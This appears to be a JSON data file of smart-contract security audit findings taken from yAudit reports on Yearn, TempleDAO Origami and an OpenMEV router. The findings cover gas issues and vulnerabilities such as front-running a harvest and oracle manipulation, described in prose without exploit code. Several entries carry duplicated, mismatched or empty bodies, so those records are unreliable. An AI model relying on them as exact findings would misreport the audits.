        "body": "BalancerGlobal.sol#L463-L472 v.setDepositLimit(depositLimit) and Vault(vault).setDepositLimit(depositLimit) both set the deposit limit to the same value. The second call is not changing the deposit limit.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. External call on each loop iteration",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "StrategyConvexFactoryClonable.sol#L484 for (uint256 i; i < rewardsContract.extraRewardsLength(); i++) { Here at each iteration an external static call is made to fetch the array length. Developer Response Fixed.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Use of SafeMath for safe arithmetic",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "StrategyConvexFactoryClonable.sol#L343: _profit = assets.sub(debt); StrategyConvexFactoryClonable.sol#L361: _loss = debt.sub(assets); StrategyConvexFactoryClonable.sol#L565: Math.min(_stakedBal, _amountNeeded.sub(_wantBal)), In all these case, SafeMath can be avoided.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Remove unused state variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "state variable numVaults in BalancerGlobal contract has been set once in createNewVaultsAndStrategies and have never been used any other function. There is an additional SSTORE operation each time we want to create a new vault.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Use >0 for unsigned integers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "!= 0 is a cheaper operation compared to >0, when dealing with uint. >0 can be replaced with != 0 for gas optimization. The >0 has been used in many places in BalancerGlobal and StrategyConvexFactoryClonable contract such as here and here.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Storage variable numVaults in BalancerGlobal is not needed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "The variable is set only once in numVaults = deployedVaults.length;. There is no need to use a separate storage slot for this value, you can just add a getter method for deployedVaults.length instead Recommendation Add a getter method for deployedVaults.length and remove numVaults storage variable. Developer Response Great. Fix has been taken. 7. Gas - recalculation not needed (datapunk) Proof of concept As marked in the the snippet below, there is no need to recalculate _profit.add(_debtPayment) and _profit In L#345 uint256 toFree = _profit.add(_debtPayment); //freed is math.min(wantBalance, toFree) (uint256 freed, ) = liquidatePosition(toFree); if (_profit.add(_debtPayment) > freed) { // *** if (_debtPayment > freed) { _debtPayment = freed; _profit = 0; } else { _profit = freed - _debtPayment; // *** remove } } Recommendation use toFree in place of _profit.add(_debtPayment) and remove else { ... } 8. Gas - remove tradesEnabled (datapunk) Proof of concept tradesEnabled appeared twice in StrategyConvexFactoryClonable.sol#L153, StrategyConvexFactoryClonable.sol#L301 It does not seem to have any practical usage. In case there is a usage, _removeTradeFactoryPermissions() should correspondingly mark tradesEnabled = false;. Recommendation Remove tradesEnabled Developer Response It has been removed, thanks. 9. Gas - Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions (verypoor) Proof of concept If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. recalculation not needed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "As marked in the the snippet below, there is no need to recalculate _profit.add(_debtPayment) and _profit In L#345 uint256 toFree = _profit.add(_debtPayment); //freed is math.min(wantBalance, toFree) (uint256 freed, ) = liquidatePosition(toFree); if (_profit.add(_debtPayment) > freed) { // *** if (_debtPayment > freed) { _debtPayment = freed; _profit = 0; } else { _profit = freed - _debtPayment; // *** remove } } Recommendation use toFree in place of _profit.add(_debtPayment) and remove else { ... } 8. Gas - remove tradesEnabled (datapunk) Proof of concept tradesEnabled appeared twice in StrategyConvexFactoryClonable.sol#L153, StrategyConvexFactoryClonable.sol#L301 It does not seem to have any practical usage. In case there is a usage, _removeTradeFactoryPermissions() should correspondingly mark tradesEnabled = false;. Recommendation Remove tradesEnabled Developer Response It has been removed, thanks. 9. Gas - Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions (verypoor) Proof of concept If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. remove tradesEnabled",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "tradesEnabled appeared twice in StrategyConvexFactoryClonable.sol#L153, StrategyConvexFactoryClonable.sol#L301 It does not seem to have any practical usage. In case there is a usage, _removeTradeFactoryPermissions() should correspondingly mark tradesEnabled = false;. Recommendation Remove tradesEnabled Developer Response It has been removed, thanks. 9. Gas - Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions (verypoor) Proof of concept If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Redundant external call when using staticcall",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Upgrade Pragma",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Missing events in BalancerGlobal & StrategyConvexFactoryClonable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "StrategyConvexFactoryClonable has several occurrences of the safeApprove method calls. This method has been deprecated by OpenZeppelin and its usage is discouraged.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. ERC20.safeApprove is deprecated",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "StrategyConvexFactoryClonable has several occurrences of the safeApprove method calls. This method has been deprecated by OpenZeppelin and its usage is discouraged.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. incorrect comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "L505 comment on turnOffRewards() says it will set the allowance on the router to 0. This doesnt happen in turnOffRewards",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. hardcoded addresses",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "Hard coded addresses in multiple places: StrategyConvexFactoryClonable.sol and BalancerGlobal.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. VaultRegistry.latestVault() functions can consume all gas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "Vault registry is a proxy and 0xc3efbfdb50cf06e8e5bb623af28678d72caeafea is its current implementation. It has 2 latestVault() functions: function latestVault(address _token) external view returns (address) { address[] memory tokenVaults = vaults[_token][VaultType.DEFAULT]; // dev: no vault for token return tokenVaults[tokenVaults.length - 1]; // dev: no vault for token } function latestVault(address _token, VaultType _type) external view returns (address) { address[] memory tokenVaults = vaults[_token][_type]; return tokenVaults[tokenVaults.length - 1]; // dev: no vault for token } Both the functions copy the storage array in memory.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Harvesting vault can be front-run for profit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "Calling harvestRewards() will collect and distribute rewards. A bad actor can deposit tokens into the ovToken before the harvest and withdraw from ovToken right after. The sharesToReserves value will instantaneously increase and the attacker will be able to withdraw more tokens than deposited with reduced incentives for users to invest in the protocol in the future.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. _handleGmxRewards() returned values can lead to wrong accounting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "The function _handleGmxRewards() calculates GMX rewards based on balance changes and claimable rewards from GLP without considering if the claimed tokens are staked. When staking rewards, the code doesn't set to zero esGmxFromGlp. This is inconsistent with esGmxFromGmx computed using a balance change esGmxFromGlp and will be zero if rewards get staked. OrigamiGmxEarnAccount.sol#L396-L424",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Use glpRewardRouter for fetching glp trackers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "Currently, both routers point to the same trackers, but this could change. Deployed glpRewardRouter, for GMX trackers aren't set, points to address 0. The same could happen for gmxRewardRouter, GLP trackers could point to address 0.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. No Chainlink staleness check in oraclePrice()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "The Chainlink latestRoundData() function returns price data along with the roundId and timestamp of the data. If the data is stale, it should be discarded. Otherwise the protocol will trust outdated data that could lead to a loss of value from using an inaccurate exchange rate. It is recommended to check the roundId and timestamp values that the oracle returns, as shown in other security report findings here and here.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Variables could be immutables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "These variables can be declared immutable: /// @notice $GMX IERC20Upgradeable public gmxToken; /// @notice $esGMX - escrowed GMX IERC20Upgradeable public esGmxToken; /// @notice $wrappedNative - wrapped ETH/AVAX IERC20Upgradeable public wrappedNativeToken; These three variables won't change. The contract constructor can set them appropriately.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Initialize variable only if needed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "Variable esGmxReinvested is initialized before the if statement but it's only used inside the if block.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Reuse local variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "Variable fromToken can be reused instead of initializing the new variable tokenIn. The same applies to variable tokenOut. Local variable reserveAmount can be dropped from here and here if inline is used like this: underlyingQuoteData.underlyingExitQuoteData.investmentTokenAmount = _redeemReservesFromShares",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Use msg.sender not owner()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "It is cheaper to call msg.sender instead of ownable() when they both return the same value. If this change is made in the constructor of MintableToken, the range of gas used on the deployment of MintableToken is reduced from the original range of 2296764-2296884 to 2296354-2296474, saving roughly 400 gas.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Incorrect comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "File OrigamiGmxInvestment has a comment with an incorrect file name.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Oracles price can be exploited",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "TokenPrices.sol#L74: this price oracle can be exploited with a single block sandwich attack. TokenPrices.sol#L85: this price oracle can be exploited via a multi-block attack by block producers. More info.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Update comment to NatSpec format",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "In file OrigamiGmxManager variables primaryEarnAccount and secondaryEarnAccount could be in NatSpec format. At least two comments (1, 2) are missing the @notice NatSpec tag. Finally, the comment on reservesToShares() is identical to the comment on sharesToReserves(), which is incorrect. The comment for reservesToShares() should be reversed to read \"How many shares given a number of reserve tokens\".",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Verify fees and rewards addresses",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "Setter functions in OrigamiGmxManager for feeCollector and rewards aggregators doesn't verify input for the default 0 value. There are no checks to prevent an address of 0 when the fees and rewards are distributed.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Remove removeReserves(uint256 amount)",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "The function enables operators to take all reserveToken which can after be redeemed for other tokens depending on the OrigamiInvestment implementation. Even recoverToken(address _token, address _to, uint256 _amount) function, which is limited to only the owner, verifies the owner cannot drain the protocol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Trader Joe AMM is moving liquidity to a new AMM design",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "Trader Joe is used as a price oracle on TokenPrices.sol#L74. Trader Joe announced a new AMM design with breaking ABI changes. The design will allow anyone, not just Trader Joe, to create new trading pools, so liquidity is expected to move to the new AMM. announcement doc",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Incorrect NatSpec",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "On Operators.sol#L19 @dev NatSpec specifies this __Operators_init() initializes the owner, but it's not initializing the owner.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. addToReserveAmount could be a percentage value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "In _compoundOvGmxRewards() and _compoundOvGlpRewards(), the number of tokens to add to the reserve could be calculated using the returned value from investWithToken() and a percentage. This change would improve the precision of tokens added to the reserve, making it easier to send 100% of the rewards after slippage to the reserve.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Replace deprecated dependency",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "draft-ERC20Permit.sol is the old file in @openzeppelin/contracts which has been replaced with ERC20Permit.sol. Remove the import of draft-ERC20Permit.sol and instead import ERC20Permit.sol. A related simplification is the ERC20.sol dependency can be removed from MintableToken because it is already imported through ERC20Permit.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Unusual Operator.sol implementation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "The Operator.sol contract is implemented in the same pattern as contracts from openzeppelin-contracts-upgradeable. This includes inheriting Initializeable and having an init function. But unlike other OZ upgradeable contracts, the init functions in Operator.sol don't do anything. There is no difference in the contract if it is initialize or not. A side effect of how this contract is used by other contracts is that every contract that inherits Operator.sol will have its own list of operators. If the intent is to manage only a single list of operators that have access to several different contracts, then consider deploying Operator.sol on its own, rather than as a dependency, and integrate it with the other contracts accordingly.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Reconsider using DEFAULT_ADMIN_ROLE",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "OpenZeppelin's documentation for DEFAULT_ADMIN_ROLE warns that the role is effectively a superuser. If the only changing of roles is through addMinter() and revokeRole(), using DEFAULT_ADMIN_ROLE and importing AccessControl may be overkill. It could be simpler to maintain a mapping of addresses that have this access instead of inheriting the library. Related to this, addMinter() and removeMinter() have duplicate modifiers. In the existing code, the caller must be the owner because of the modifier in MintableToken and the caller must be the adminRole because of the modifier in AccessControl. Consider removing the onlyOwner modifier to save gas.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Consider zero for minAmount",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "glpRewardRouter.mintAndStakeGlp() has two minAmount arguments. Only one of these is really necessary. Consider removing the other and replacing it with a zero minAmount depending on the standard use case for the mintAndStakeGlp() function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Broken link",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "TokenPrices.sol links to https://docs.uniswap.org/sdk/guides/fetching-prices which returns Page Not Found. Consider linking to the archived page https://web.archive.org/web/20210918154903/https://docs.uniswap.org/sdk/guides/fetching-prices.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Typo",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md",
        "body": "adggregator -> aggregator",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. The swap and stake mechanisms in OpenMevZapper leave funds in the contract",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "Both swapAndStakeLiquidity and swapETHAndStakeLiquidity take the input tokens or ETH sent by a user, divide it by 2, swap it into the B token, and stake these tokens as a pair. However, this approach leaves some of the B token in the contract due to the reserve asset ratio change before and after the swap.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Using normal functions for fee-on-transfer tokens causes value loss",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The NatSpec comment for removeLiquidityETHSupportingFeeOnTransferTokens() includes Identical to removeLiquidityETH, but succeeds for tokens that take a fee on transfer The only difference in these functions, and what is implied to cause the revert condition in removeLiquidityETH(), is the amount used in safeTransfer(). removeLiquidityETH() has an amount of amountToken, while removeLiquidityETHSupportingFeeOnTransferTokens() uses ERC20(token).balanceOf(address(this)) - balanceBefore. This does cause a revert in Uniswap's code because of the Uniswap assumption that the router holds no token balance, but OpenMevRouter can hold a token balance. The process of value loss is: Fee-on-transfer token is held by the router. This can happen either with an initial deposit by the Manifold team or from backrun arbitrage profits. The devs suggested the tokens that will be sent to the router will likely be tokens that Aave does not support flashloans for, which could include lesser known tokens with fee-on-transfer support. User wants to remove liquidity from WETH-ERC20 pair where the ERC20 has a non-zero fee-on-transfer. Instead of using removeLiquidityETHSupportingFeeOnTransferTokens(), the user calls removeLiquidityETH(). The code of removeLiquidityETHSupportingFeeOnTransferTokens() and removeLiquidityETH() is identical except for the amount in ERC20(token).safeTransfer(). The amountToken value used in removeLiquidityETH() is greater than the amount of fee-on-transfer tokens received from the removeLiquidity() call, so the amount transferred to the user will include some of the token balance that was held by the router before the user's remove liquidity interaction. Result: The router lost value in the form of the transfer-on-fee token",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Backrun arb not designed for fee-on-transfer tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "While Aave and Kashi do not currently allow flashloans on any fee-on-transfer tokens, this call of _arb() using internal router contract funds is problematic. The first and second swaps are performed with _asmSwap(), which have a safeTransfer() performed first to send the token to the pair address. It is assumed that the amountOut value calculated by OpenMevLibrary.getAmountOut() accurately stores the amount of tokens that the router contract receives from the swap process. Instead, to support fee-on-transfer tokens, a calculation of ERC20(token).balanceOf(address(this)) - balanceBefore as found in the router function removeLiquidityETHSupportingFeeOnTransferTokens() should be used. The _arb() function can even cause problems when neither the first nor last token is a fee-on-transfer token, but one of the intermediate swaps uses a fee-on-transfer token. Because the _backrunSwaps() function loops through the array of swaps, any of the backrun swaps that involve a fee-on-transfer token could be problematic.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Failed flashloan arbitrage reverts the original swap",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "These lines include the revert for each flashloan [1, 2].",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Edge case suboptimal arb profit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The logic branch checks if contractAssetBalance >= optimalAmount, otherwise a flashloan is used.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. One failed arb can revert otherwise profitable arb",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The _backrunSwaps() function loops through the array of swaps. Imagine a scenario where _backrunSwaps() is called with a swaps array of length 4. Assume the 1st, 2nd, and 4th backrun swaps are profitable, but the 3rd backrun swap is not. Performing this series of four backrun swaps can still be net profitable even if one of the individual backrun swaps is not. The reason the 3rd backrun swap is not profitable may be because the flashloan fee costs more than the profit of this arb, which reverts here or here, or a similar revert can happen if the router contract funds are used for the arb and the amount received is less than expected. The result is the transaction reverts and OpenMevRouter will miss out on the arb profits if the swaps had been completed even if one individual backrun swap wasn't profitable.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Max approval granted to spender",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "ERC20(token).safeApprove(spender, type(uint256).max); in _approveTokenIfNeeded approves the spend to spent the entire balance.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. No check For Aave flashloan balance",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "L915 of OpenMevRouter",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Use _isNonZero() for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Use _inc() instead of ++ and _dec() instead of --",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "There is one instance of an increment improvement. There are two instances of a double decrement that could be replaced with _dec(_decr()) or with unchecked { length - 2; }: First instance Second instance",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Bitshifting is cheaper than multiplication or division",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "There are four instance of divide by 2 operations that can use bitshifting for gas efficiency: First instance Second instance Third instance Fourth instance",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Unnecessary zero initialization",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Payable functions can save gas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The following functions have the onlyOwner modifier and can be marked as payable First function Second function Third function",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Avoid && logic in require statements",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "One instance of require with && logic was found.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Declare constant internal when possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The bento constant should be internal if possible.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Replace require with errors in OpenMevRouter",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
